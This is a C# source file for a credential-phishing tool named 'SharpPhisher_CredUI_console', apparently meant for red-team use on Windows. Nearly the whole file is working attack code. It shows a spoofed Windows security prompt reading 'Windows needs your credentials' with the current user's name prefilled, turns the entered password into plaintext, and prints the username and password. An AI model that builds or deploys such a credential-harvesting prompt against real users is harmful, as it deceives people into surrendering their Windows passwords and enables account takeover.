using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Security;
using Misuzilla.Security;

namespace SharpPhisher_CredUI_console
{
    class Program
    {
        static void Main(string[] args)
        {
            PromptCredentialsResult cred = null;
            PromptCredentialsSecureStringResult credSecure = null;
            String kur = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            var defaultUserName = kur.ToSecureString();

            /*
            // Method 1
            credSecure = CredentialUI.PromptForWindowsCredentialsWithSecureString("Caption", "Message");
            // Method 2
            cred = CredentialUI.Prompt("Caption", "Message");
            */
            credSecure = CredentialUI.PromptWithSecureString("Security", "Windows needs your credentials", defaultUserName, null);

            if (credSecure != null)
            {
                String userNameRaw = credSecure.UserName.ToInsecureString();
                String passwordRaw = credSecure.Password.ToInsecureString();
                Console.WriteLine("[+] Creds:");
                Console.WriteLine("Username: {0}", userNameRaw);
                Console.WriteLine("Password: {0}", passwordRaw);
            }
            if (cred != null)
            {
                Console.WriteLine("Username: {0}", cred.UserName);
                Console.WriteLine("Password: {0}", cred.Password);
            }
            Console.WriteLine("[+] END OF OUTPUT");
            Console.Read();
        }
    }
    public static class Extension
    {
        public static SecureString ToSecureString(this String s)
        {
            SecureString ss = new SecureString();
            foreach (var c in s)
                ss.AppendChar(c);
            ss.MakeReadOnly();
            return ss;
        }

        public static String ToInsecureString(this SecureString s)
        {
            IntPtr p = IntPtr.Zero;
            try
            {
                p = Marshal.SecureStringToCoTaskMemUnicode(s);
                return Marshal.PtrToStringUni(p);
            }
            finally
            {
                if (p != IntPtr.Zero)
                    Marshal.ZeroFreeCoTaskMemUnicode(p);
            }
        }
        public static SecureString PtrToSecureString(IntPtr p)
        {
            SecureString s = new SecureString();
            Int32 i = 0;
            while (true)
            {
                Char c = (Char)Marshal.ReadInt16(p, ((i++) * sizeof(Int16)));
                if (c == '\u0000')
                    break;
                s.AppendChar(c);
            }
            s.MakeReadOnly();
            return s;
        }
        public static SecureString PtrToSecureString(IntPtr p, Int32 length)
        {
            SecureString s = new SecureString();
            for (var i = 0; i < length; i++)
                s.AppendChar((Char)Marshal.ReadInt16(p, i * sizeof(Int16)));
            s.MakeReadOnly();
            return s;
        }
    }
}
